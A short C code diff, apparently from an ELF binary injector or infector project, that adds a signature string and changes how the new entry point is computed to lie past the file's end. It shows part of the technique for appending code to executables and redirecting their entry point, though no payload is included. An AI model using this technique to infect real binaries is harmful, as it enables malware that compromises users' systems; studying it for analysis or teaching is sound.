@@ -23,6 +23,7 @@ t_binary get_infos(int fd)
 {
 	t_binary res;
 	Elf64_Ehdr e_hdr;
+	char signature[] = SIGNATURE;
 
 	LSEEK(fd, 0, SEEK_SET);
 	READ(fd, &e_hdr, sizeof(e_hdr));
@@ -32,11 +33,7 @@ t_binary get_infos(int fd)
 	debug_u64("* file_size: ", res.file_size);
 	res.v_addr = get_virt_addr(fd);
 	debug_u64("* v_addr: ", res.v_addr);
-	if (PAYLOAD_ALIGN)
-		res.new_entry = PAYLOAD_ALIGN - res.file_size % PAYLOAD_ALIGN +
-		res.file_size + res.v_addr;
-	else
-		res.new_entry = res.file_size + res.v_addr;
+	res.new_entry = res.file_size + res.v_addr + sizeof(signature) - 1;
 	debug_u64("* new_entry: ", res.new_entry);
 	return (res);
 }
